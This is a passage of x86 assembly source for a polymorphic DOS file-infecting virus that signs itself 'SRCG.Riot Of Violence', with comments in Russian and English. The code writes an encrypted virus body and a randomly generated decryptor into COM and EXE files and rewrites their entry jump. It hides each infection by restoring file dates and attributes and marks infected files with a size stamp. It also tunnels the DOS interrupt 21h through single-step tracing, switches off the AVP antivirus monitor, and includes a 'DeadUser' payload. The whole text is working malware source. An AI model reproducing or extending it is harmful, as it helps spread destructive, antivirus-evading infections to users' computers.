InfectionCOM4:	call WriteVirusBody

		push cs			;вычисляем смещение
		pop ds
		add cx,LOffsetInFile
		sub cx,3
		mov word ptr Header+1,cx

		call RandomWord
		mov cx,ax
		mov ax,0E9E8h		;call or jmp ?
Choose:		xchg ah,al
		loop Choose
		mov byte ptr Header,al

		mov ax,4200h		;в начало
		xor cx,cx
		cwd
		call INT21

		mov ah,40h		;пишем jmp (or call)
		mov dx,offset Header
		mov cx,3
		call INT21

		call RestoreDate

		jmp Close&Restore	;close file & restore all


;--------------------- Get size of decryptor (8-16K) --------------------------
GetSize:	mov ax,2000h
		call Rnd
		add ax,2000h
		mov CSIZE,ax		;decryptor len
		add ax,offset TheEnd-offset Virus
		mov VirLen,ax		;virus len
		ret


;------------------------------------------------------------------------------
WriteVirusBody:	call CreateDecryptor	;es:0 - decryptor, len = CSIZE+Decrypt2

		push dx
		mov bx,FileHandle
		mov ax,4200h
		mov cx,HOffsetInFile
		mov dx,LOffsetInFile
		call INT21

		mov ah,40h		;пишем расшифровщики в файл
		mov cx,CSIZE
		add cx,offset StartOfVirus-offset Virus
		push es
		pop ds
		xor dx,dx
		call INT21

		pusha
		xor bp,bp
		call RandomCryptDecrypt	;криптуем "данные лечения"
		popa

		push cs			;копируем тело вируса в рабочую область
		pop ds
		mov si,offset StartOfVirus
		xor di,di
		mov cx,TheEnd-offset StartOfVirus
		cld
		rep movsb

		mov ax,word ptr cs:[K1]
		mov dx,word ptr cs:[K2]
		xor di,di
		mov cx,TheEnd-offset StartOfVirus
		call CryptData
		
		push es			;дописываем зашифрованное тело вируса.
		pop ds
		xor dx,dx
		mov cx,TheEnd-offset StartOfVirus
		mov ah,40h
		call INT21

		mov cx,80h		;100h байт мусора
		xor di,di
		cld
Junk:		call RandomWord
		stosw
		loop Junk

		mov ax,4202h		;в конец файла
		xor cx,cx
		cwd
		call INT21

		mov cx,77h		;сколько нужно дописать чтобы файл
		div cx			;считался зараженным?
		sub cx,dx
		add cx,48h
		mov word ptr cs:[StampLen],cx

		mov ah,40h		;пишем...
		xor dx,dx
		call INT21
		pop cx			;cx - offset точки входа в декриптор
		ret


;------------------------- Good user - DEAD user ------------------------------
db " Extreme aggressions..."

DeadUser:

include kill.inc

db "...Condemned my soul to hell for all time! "


;------------------------- Всякие подпрограммы --------------------------------
;------------------ Close file, restore attributes and exit -------------------
Close&Restore:	mov ah,3Eh
		call INT21

		call RestoreAttr

		jmp ExitVir

;-------------------- Restore attributes,date and time ------------------------
RestoreAttr:	call KillFilename
		mov ax,4301h
		mov cx,cs:Attrib
		call INT21
		ret

RestoreDate:	mov ax,5701h
		mov cx,cs:FileTime
		mov dx,cs:FileDate
		call INT21
		ret

;------------------------------ Check file len --------------------------------
CheckLen:	push ax
		push cx
		push dx
		push bx

		mov ax,word ptr ds:[Header+8]
		mov cx,10h
		mul cx
		mov cx,H_RealFileLen
		mov bx,L_RealFileLen
		sub bx,ax
		sbb cx,dx		;cx:bx = image length

		or cx,cx
		jnz LenOk
		cmp bx,VirLen
		ja LenOk
		stc
		jmp ExitProc
LenOk:		clc
ExitProc:	pop bx
		pop dx
		pop cx
		pop ax
		ret

;---------------------------------- RDA ---------------------------------------
include rda.inc

;----------- (Рас)Шифруем область ES:DI, CX/2 байт. Ключи AX,DX ---------------
CryptData PROC NEAR

		shr cx,1
XorNextWord:	xor es:[di],ax
		add ax,dx
		inc di
		inc di
		loop XorNextWord
		ret

CryptData ENDP


;----------------------------- Int 21h call -----------------------------------
INT21 PROC NEAR
		pushf
Caller:		db 9Ah,0,0,0,0
		ret
INT21 ENDP

;--------------------- Восстановления обработчика INT 21 ----------------------
RestoreHandle:	cmp cs:Mode,0
		je $+3
		ret
		push ds
		push cs
		pop ds
		mov si,offset OldHandle
		mov es,OLD_CS
		mov di,OLD_IP
		mov cx,@SIZE
		sub di,cx
		cld
		cli
		rep movsb	;restore old int 21 handle
		sti
		pop ds
		ret

;-------------------- Call INT 21 & restore JUMP FAR --------------------------
RealINT21:	db 0EBh
		Mode db 0

		lds si,dword ptr cs:OLD_IP
		push si
		push cs
		pop es
		mov di,offset Next5Bytes
		cld
		movsw
		movsw
		movsb
		pop si

		mov byte ptr ds:[si],0EAh
		mov ds:[si+1],offset Restore5Bytes
		mov ds:[si+3],cs

		sub si,cs:@SIZE
		mov cs:IP21,si
		mov cs:CS21,ds

WinInt21:	pop es
		pop ds
		popa
		popf

		jmp $+2

db 0EAh		;jmp far ContinueInt21
IP21 dw 0
CS21 dw 0

Restore5Bytes:	pushf
		push ds
		push es
		push si
		push di

		push cs
		pop ds
		mov si,offset Next5Bytes
		mov es,OLD_CS
		mov di,OLD_IP
		cld
		movsw
		movsw
		movsb

		sub di,5
		sub di,cs:@SIZE
		mov byte ptr es:[di],0EAh
		mov es:[di+1],offset INT21Handle
		mov es:[di+3],cs

		pop di
		pop si
		pop es
		pop ds
		popf
		jmp dword ptr cs:OLD_IP

;------------------------------------------------------------------------------
TraceMaster:	mov word ptr es:[offset Int21Call],si
		mov word ptr es:[offset Int21Call+2],ds

		push es
		push offset SetInt
		retf

SetInt:		push 0
		pop ds
		mov ax,offset Int1Handle
		xchg ax,ds:[4]
		mov word ptr cs:[offset Int1_IP],ax
		mov ax,cs
		xchg ax,ds:[6]
		mov word ptr cs:[offset Int1_CS],ax

		pushf

		pushf
		pop ax
		or ah,1
		push ax
		mov ah,30h
		popf

db 9Ah
Int21Call dd 0	

		mov ax,cs
		cmp cs:_CS,ax
		je Oblom
		mov ds,cs:_CS
		mov si,cs:_IP
		clc
		retf
Oblom:		lds si,cs:Int21Call
		stc
		retf


;--------------------------- Trace anti-detector ------------------------------
CS_PREF EQU 2Eh
DS_PREF EQU 3Eh
ES_PREF EQU 26h
SS_PREF EQU 36h
FS_PREF EQU 64h
GS_PREF EQU 65h
REPE_PREF EQU 0F3h
REPNE_PREF EQU 0F2h
LOCK_PREF EQU 0F0h

;----------------------- Поиск настоящего INT 21h -----------------------------
CMP_Proc:	cmp cs:_CS,300h		;dos low
		jb Stop
HighDos:	cmp cs:_CS,0C800h	;dos high
		ja Stop
		jmp CheckPrefix

;--------------------- Поиск места для врезки CALL FAR ------------------------
CMP_Proc1:	mov ds,cs:OLD_CS
		mov si,cs:OLD_IP
		cmp byte ptr ds:[si],0E9h
		je Reset
		cmp byte ptr ds:[si],0EBh
		je Reset
		cmp byte ptr ds:[si],70h
		jb NextInstrSize
		cmp byte ptr ds:[si],77h
		jbe Reset

NextInstrSize:	mov ax,cs:_CS
		sub ax,cs:OLD_CS
		jnz Reset		;check for far jmp`s, call`s, etc
		mov ax,cs:_IP
		sub ax,cs:OLD_IP	;ax = lenght of executed intruction
		jc Reset
		add cs:@SIZE,ax
		jc Reset

		call SaveCS_IP

		cmp cs:@SIZE,5
		jae CheckMax
		jmp CheckPrefix		;very small
CheckMax:	cmp cs:@SIZE,7		;very large
		jb Stop			;Ok-Ob

Reset:		call SaveCS_IP

		mov cs:@SIZE,0
		jmp CheckPrefix

SaveCS_IP:	mov ax,cs:_CS		;save current cs:ip
		mov cs:OLD_CS,ax
		mov ax,cs:_IP
		mov cs:OLD_IP,ax
		ret

;------------------------------------------------------------------------------		
Stop:		push 0
		pop ds
		cli
		Int1_IP EQU $+4
		mov word ptr ds:[4],0
		Int1_CS EQU $+4
		mov word ptr ds:[6],0
		sti

		and cs:FLAGS,0FEFFh
		jmp ExitHandle


;------------------------- Трассировщик INT`ов --------------------------------
Int1Handle:	mov cs:_AX,ax
		mov cs:_CX,cx
		mov cs:_SI,si
		mov cs:_DS,ds

		pop ax				;clear stack
		mov cs:_IP,ax
		pop ax
		mov cs:_CS,ax
		pop ax
		mov cs:FLAGS,ax

CheckSeg:	mov ax,cs
		cmp cs:_CS,ax
		je Stop

		db 0E9h
		ChkProc dw 0			;check END TRACING conditions

CheckPrefix:	mov ds,cs:_CS
		mov si,cs:_IP

NextPrefix:	cmp byte ptr ds:[si],CS_PREF	;kill prefixes
		je FoundPrefix
		cmp byte ptr ds:[si],DS_PREF
		je FoundPrefix
		cmp byte ptr ds:[si],ES_PREF
		je FoundPrefix
		cmp byte ptr ds:[si],SS_PREF
		je FoundPrefix
		cmp byte ptr ds:[si],FS_PREF
		je FoundPrefix
		cmp byte ptr ds:[si],GS_PREF
		je FoundPrefix
		cmp byte ptr ds:[si],REPE_PREF
		je FoundPrefix
		cmp byte ptr ds:[si],REPNE_PREF
		je FoundPrefix
		cmp byte ptr ds:[si],LOCK_PREF
		jne CheckCommand

FoundPrefix:	inc si
		jmp NextPrefix

CheckCommand:	cmp byte ptr ds:[si],9Ch
		je _PUSHF
		cmp byte ptr ds:[si],9Dh
		je _POPF

		cmp byte ptr ds:[si],0CDh
		jne _INT_3
		cld
		lodsw
		and ax,0FF00h
		shr ax,6
		jmp _INT

_INT_3:		cmp byte ptr ds:[si],0CCh
		jne _INTO
		inc si
		mov ax,0Ch
		jmp _INT

_INTO:		cmp byte ptr ds:[si],0CEh
		jne Other
		inc si
		mov ax,10h
		jmp _INT

Other:		cmp byte ptr ds:[si],0CFh
		je _IRET
		cmp byte ptr ds:[si],17h
		je _POP_SS
		cmp byte ptr ds:[si],8Eh
		jne ExitHandle
		cmp byte ptr ds:[si+1],0D0h
		jb ExitHandle
		cmp byte ptr ds:[si+1],0D7h
		jbe _MOV_SS

ExitHandle:	db 68h
		_DS dw 0
		pop ds
		db 0BEh			;mov si,
		_SI dw 0
		db 0B8h			;mov ax,
		_AX dw 0
		db 0B9h			;mov cx,
		_CX dw 0

		db 68h			;push NN
		FLAGS dw 0
		db 68h			;push NN
		_CS dw 0
		db 68h			;push NN
		_IP dw 0
		iret

_PUSHF:		inc si			;clear TF
		mov cs:_IP,si
		mov ax,cs:[FLAGS]
		and ax,0FEFFh
		push ax
		jmp CheckSeg

_POPF:		pop ax			;set TF
		or ax,100h
		push ax
		jmp CheckSeg

_INT:		mov cx,cs:[FLAGS]	;set TF, clear in stack
		and cx,0FEFFh
		push cx
		push ds
		push si
		push 0
		pop ds
		mov si,ax
		lds si,ds:[si]
		mov cs:_CS,ds
		mov cs:_IP,si
		jmp CheckSeg

_IRET:		mov si,sp		;set TF
		or ss:[si+4],100h
		jmp CheckSeg

_POP_SS:	inc si
		mov cs:_IP,si
		pop ss
		jmp CheckSeg

_MOV_SS:	cld
		lodsw
		mov cs:_IP,si
		mov cs:Command,ax
		mov ax,cs:_AX
		mov si,cs:_SI
		jmp $+2
Command dw 0
		mov si,cs:_IP
		jmp CheckSeg


;--------------- Сохраняем адрес на который смотрит INT 2Ah -------------------
SaveINT2A:	push ds
		push 0
		pop ds
		lds si,ds:[2Ah*4]
		mov cs:INT2A_IP,si
		mov cs:INT2A_CS,ds
		pop ds
		ret

;------------- Trick against AVP monitor (switch off int 2A) ------------------
KillINT2A:	mov ax,offset INT2AOff
ChangeINT2A:	cli
		push ds
		push 0
		pop ds
		mov ds:[2Ah*4],ax
		mov ds:[2Ah*4+2],cs
		pop ds
		sti
		ret

;----------------------- Restore old int 2A handle ----------------------------
RestoreINT2A:	push 0
		pop ds
		cli
		mov ax,cs:INT2A_IP	;отпустим INT 2A
		mov ds:[2Ah*4],ax
		mov ax,cs:INT2A_CS
		mov ds:[2Ah*4+2],ax
		sti
		mov al,cs:[IRQ_State]
		jmp $+2
		out 21h,al
		jmp $+2
		ret

;------------------------- Fuck AV - monitors ---------------------------------
KillFilename:	lds si,dword ptr cs:DotOffset
		mov dx,cs:FileNameOffset

		call CheckWindows
		jnz WindowsMustDie

		mov byte ptr ds:[si],0	;change name: FUCK.EXE --> FUCK to
					;avoid AV monitors. Thanx to SSR.
		mov ax,offset INT2AHandle
		call ChangeINT2A

WindowsMustDie:	ret

;---------------------- Restore name of opening file --------------------------
INT2AHandle:	pusha		
		push ds
		lds si,dword ptr cs:DotOffset
		mov byte ptr ds:[si],"."
		call KillINT2A
		pop ds
		popa
INT2AOff:	iret

;------------------------- Set our Int 24h ------------------------------------
KillInt24:	push ds
		push 0
		pop ds
		mov ax,offset INT24Handle
		cli
		xchg ds:[24h*4],ax
		mov cs:Int24_IP,ax
		mov ax,cs
		xchg ds:[24h*4+2],ax
		mov cs:Int24_CS,ax
		sti
		pop ds
		ret
;------------------------- Restore Int 24h ------------------------------------
RestoreInt24:	push ds
		push 0
		pop ds
		cli
		mov ax,cs:Int24_IP
		mov ds:[24h*4],ax
		mov ax,cs:Int24_CS
		mov ds:[24h*4+2],ax
		sti
		pop ds
		ret

;----------------------------- Int 24h ----------------------------------------
INT24Handle:	mov al,3
		iret

;------------------------ If windows active ZF=0 ------------------------------
CheckWindows PROC NEAR
		pusha
		mov ax,160Ah
		xor bh,bh
		int 2Fh
		or bh,bh
		popa
		ret
CheckWindows ENDP

;------------------- Check for stamp "already infected" -----------------------
CheckForInfected PROC NEAR
		push ax
		push dx
		mov cx,77h
		div cx
		cmp dx,48h
		pop dx
		pop ax
		ret
CheckForInfected ENDP

;--------------------- Init RND generator -------------------------------------
RNDInit:	push ds
		push ax
		push dx
		push 0
		pop ds
		mov ax,ds:[46Ch]
		mov dx,ds:[46Eh]
		mul dx
		mov word ptr cs:[bp+RndData],ax
		mov word ptr cs:[bp+RndData+2],dx
		pop dx
		pop ax
		pop ds
		ret


;-------------------------- Подвинем file pointer -----------------------------
MovePointer:	mov ax,4200h			;file pointer - на 1ый элемент
		xor cx,cx
		mov dx,word ptr ds:[Header+18h]	;смещение 1го элемента
                call INT21
		ret


;------------------------ Получим смещение в файле ----------------------------
EXEGetOffset:	mov ax,word ptr ds:[Header+8]
		mov dx,10h
		mul dx			;dx:ax - размер заголовка
		push dx
		push ax
		add ax,cx
		adc dx,0
		mov cx,L_RealFileLen
		sub cx,ax
		xchg ax,cx
		mov cx,H_RealFileLen
		sbb cx,dx
		xchg cx,dx		;dx:ax - image len

		call GetOffset

		pop cx
		add ax,cx
		mov LOffsetInFile,ax
		pop cx
		adc dx,cx
		mov HOffsetInFile,dx
		ret

GetOffset:	push ax			;dx:ax = max offset (image - length)
		mov ax,dx
		call Rnd
		cmp ax,dx
		jb noxep
		xchg ax,dx
		pop ax
		call Rnd
		ret
noxep:		xchg ax,dx
		pop ax
		call RandomWord
		ret			;dx:ax = offset

;---------------  Не тронь говна - вонять не будет ----------------------------
include fucked.inc
Award db "AWARD"

db "*** SRCG.Riot Of Violence ***"

;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;Universal Virus Self-defense System - Random Code Generator
;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
CreateDecryptor:push cs			;установим сегментные регистры
		pop ds
		mov es,WorkSegment

		call RandomWord		;придумаем ключ
		mov word ptr ds:K1,ax
		call RandomWord
		mov word ptr ds:K2,ax

		mov si,offset Virus	;переносим расшифровщик
		mov di,CSIZE
		mov cx,offset StartOfVirus-offset Virus
		cld
		rep movsb

		mov DECRYPTOR,0		;где делать расшифровщик?
		mov di,CSIZE		;размер декриптора
		mov CRYPT_ADR,di	;где шифровать?
		mov cx,di
		shr cx,3
		inc cx

		add di,offset StartOfVirus-offset Virus
		mov TABLE_ADRESS,di	;где разместить рабочую таблицу?
		xor al,al
		rep stosb		;забъем ее нулями

		mov CRYPT_LEN,offset StartOfVirus-offset Virus

		mov si,CSIZE

include srcg.inc

;---------------------------- Data --------------------------------------------
INT2A_IP dw (?)
INT2A_CS dw (?)
INT24_IP dw (?)
INT24_CS dw (?)
OLD_IP dw 0
OLD_CS dw 0
@SIZE dw (?)
OldHandle db 5 dup (?)
Next5Bytes db 5 dup (?)
FileHandle dw (?)
IRQ_State db (?)
DotOffset dw (?)
FileNameSeg dw (?)
FileNameOffset dw (?)
WorkSegment dw (?)
SecondHandler dw (?)
RelocationsNumber dw (?)
Attrib dw (?)
FileDate dw (?)
FileTime dw (?)
H_RealFileLen dw (?)
L_RealFileLen dw (?)
HOffsetInFile dw (?)
LOffsetInFile dw (?)
VirLen dw (?)
DOS_SS dw (?)
DOS_SP dw (?)
Header db 1Ah dup (?)
Sign dd (?)
RealVirEnd EQU $
CSEG ENDS
END